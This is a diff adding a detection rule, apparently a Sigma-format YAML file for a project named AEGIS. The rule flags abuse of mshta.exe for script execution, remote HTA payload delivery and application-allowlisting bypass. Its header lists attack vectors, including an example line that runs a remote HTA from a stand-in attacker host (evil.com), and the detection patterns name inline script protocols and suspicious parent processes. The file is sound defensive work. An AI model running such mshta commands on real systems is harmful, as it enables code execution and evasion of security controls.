@@ -1,0 +1,113 @@
+# =============================================================================
+# AEGIS Detection Rule: LOLBin - MSHTA.exe Abuse
+# =============================================================================
+# mshta.exe (Microsoft HTML Application Host) is a legitimate Windows binary
+# that executes .hta files (HTML Applications). Adversaries abuse mshta.exe
+# to execute arbitrary scripts (JavaScript, VBScript) and download/execute
+# payloads — bypassing application whitelisting because mshta.exe is a
+# signed Microsoft binary.
+#
+# Attack Vectors:
+#   1. Direct script execution: mshta javascript:... / mshta vbscript:...
+#   2. Remote HTA execution: mshta http://evil.com/payload.hta
+#   3. HTA from suspicious locations: mshta C:\Users\...\Temp\*.hta
+#   4. Office macro → mshta pivot: Word/Excel spawns mshta for code execution
+#   5. Browser download → HTA execution: Browser spawns mshta
+#
+# Data Requirements:
+#   - Sysmon Event ID 1 (Process Creation) with CommandLine logging
+#   - Alternatively: Windows Security Event ID 4688 with command line auditing
+# =============================================================================
+
+title: Suspicious MSHTA.exe Execution - LOLBin Abuse
+id: a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d
+status: stable
+description: |
+    Detects abuse of mshta.exe (Microsoft HTML Application Host) for script
+    execution, payload delivery, and application whitelisting bypass. MSHTA
+    is a signed Microsoft binary commonly abused as a Living-off-the-Land
+    Binary (LOLBin) to execute JavaScript, VBScript, or remote HTA payloads.
+
+    This rule covers: inline script execution (javascript:/vbscript: protocols),
+    remote HTA download via HTTP(S), HTA execution from suspicious filesystem
+    locations (Temp, Downloads), and suspicious parent process chains (Office
+    applications, browsers spawning mshta.exe).
+references:
+    - https://attack.mitre.org/techniques/T1218/005/
+    - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
+    - https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)
+    - https://www.trustedsec.com/blog/mshta-used-to-bypass-application-whitelisting/
+author: AEGIS Detection Engineering
+date: 2026-10-29
+modified: 2026-10-29
+tags:
+    - attack.execution
+    - attack.t1218.005
+    - attack.defense_evasion
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    # ---- Selection Group 1: MSHTA with suspicious command line patterns ----
+    selection_mshta_process:
+        EventID: 1
+        Image|endswith: '\mshta.exe'
+
+    # Inline script execution via protocol handlers
+    selection_inline_script:
+        CommandLine|contains:
+            - 'javascript:'     # Inline JavaScript execution
+            - 'vbscript:'       # Inline VBScript execution
+            - 'about:'          # about: protocol abuse for script execution
+
+    # Remote HTA download and execution
+    selection_remote_hta:
+        CommandLine|contains:
+            - 'http://'         # Remote HTA via HTTP
+            - 'https://'        # Remote HTA via HTTPS
+
+    # HTA execution from suspicious filesystem locations
+    selection_suspicious_path:
+        CommandLine|contains:
+            - '\Temp\'          # Temporary directories
+            - '\Downloads\'     # User Downloads folder
+            - '\AppData\Local\Temp\'    # User temp directory
+            - '\ProgramData\'   # Writable by standard users in some configs
+
+    # ---- Selection Group 2: Suspicious parent processes spawning MSHTA ----
+    selection_office_parent:
+        EventID: 1
+        Image|endswith: '\mshta.exe'
+        ParentImage|endswith:
+            - '\WINWORD.EXE'    # Microsoft Word
+            - '\EXCEL.EXE'      # Microsoft Excel
+            - '\POWERPNT.EXE'   # Microsoft PowerPoint
+            - '\OUTLOOK.EXE'    # Microsoft Outlook
+            - '\MSACCESS.EXE'   # Microsoft Access
+
+    # Browsers spawning mshta (drive-by download → HTA execution)
+    selection_browser_parent:
+        EventID: 1
+        Image|endswith: '\mshta.exe'
+        ParentImage|endswith:
+            - '\chrome.exe'
+            - '\msedge.exe'
+            - '\firefox.exe'
+            - '\iexplore.exe'
+            - '\brave.exe'
+
+    condition: >
+        (selection_mshta_process and (selection_inline_script or selection_remote_hta or selection_suspicious_path))
+        or selection_office_parent
+        or selection_browser_parent
+falsepositives:
+    - Legitimate enterprise HTA applications used for internal tooling (add specific paths to exclusions)
+    - Software installation packages that use HTA-based installers
+    - IT help desk tools that leverage mshta for interactive forms
+    - Legacy intranet applications using HTA for rich client interfaces
+level: high
+
+# AEGIS-specific metadata for test harness integration
+test_fixtures:
+    - tests/fixtures/execution/lolbin_mshta_true_positive.json
+    - tests/fixtures/execution/lolbin_mshta_false_positive.json
